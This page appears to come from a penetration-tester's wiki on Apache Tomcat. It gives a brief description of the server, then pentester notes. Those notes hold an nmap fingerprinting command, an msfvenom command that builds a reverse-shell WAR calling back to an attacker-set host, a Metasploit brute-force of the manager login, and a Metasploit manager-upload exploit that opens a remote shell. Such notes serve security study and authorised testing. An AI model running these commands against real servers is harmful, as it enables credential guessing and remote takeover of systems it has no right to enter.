# Apache Tomcat

<div class="row row-cols-lg-2"><div>

[Apache Tomcat](https://tomcat.apache.org/) is an open-source web server. It provides a Java HTTP web server environment in which Java code can run.

* [GitHub](https://github.com/apache/tomcat) <small>(7.1k ⭐)</small>
* [Documentation](https://tomcat.apache.org/tomcat-11.0-doc/index.html) <small>(⛪)</small>

The version 11 is still in development. The previous major versions are version 10 <small>(2021)</small>, version 9 <small>(2018)</small>, and version 8 <small>(2016)</small>.
</div><div>

A java web application can use either or both servlets and JSPs. A combination of both is the most common architecture.

* **Servlets** ☕: the whole logic is in Java
* **JSP** 🐲: html-like template files in which we can add Java logic to handle input and create interactive pages.
</div></div>

<hr class="sep-both">

## Pentester Notes ☠️

<div class="row row-cols-lg-2"><div>

* You can use [nmap](/cybersecurity/red-team/tools/scanners/ports/nmap.md). It often runs on port 8080.

```shell!
$ sudo nmap 10.10.10.95 -sCV -v
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

* We can often easily recognize a website using Apache Tomcat from the presence of the `JSESSIONID` cookie.

* We can often easily recognize a website using Apache Tomcat from the error message page layout.

* The manager, often at `/manager/html`, is used to manage and deploy web applications might be accessible. If you have access to it, you can try to upload a reverse shell. To generate one:

*Works with Tomcat 7*

```ps
$ msfvenom -p java/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o revshell.war
```

You can try [tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer) <small>(0.4k ⭐, 2022 🪦)</small>, but it's memory hungry, buggy and unstable, and you need to patch the code first 🪦.
</div><div>

* We can try to brute force the manager account using [metasploit](/cybersecurity/red-team/tools/frameworks/metasploit/index.md).

```shell!
$ msfconsole -q
msf6> use auxiliary/scanner/http/tomcat_mgr_login
msf6> set RHOSTS <target>
msf6> set STOP_ON_SUCCESS true
msf6> set ANONYMOUS_LOGIN true
msf6> set BLANK_PASSWORDS true
msf6> run
```

If we have access to the manager, we can try to upload a reverse shell. Metasploit servlet doesn't work with Tomcat 7 and before.

```shell!
$ msfconsole -q
msf6> use exploit/multi/http/tomcat_mgr_upload
msf6> set RHOSTS <target>
msf6> set RPORT 8080
msf6> set HttpUsername tomcat
msf6> set HttpPassword s3cret
msf6> set LHOST tun0
msf6> set VERBOSE true
msf6> run
```
</div></div>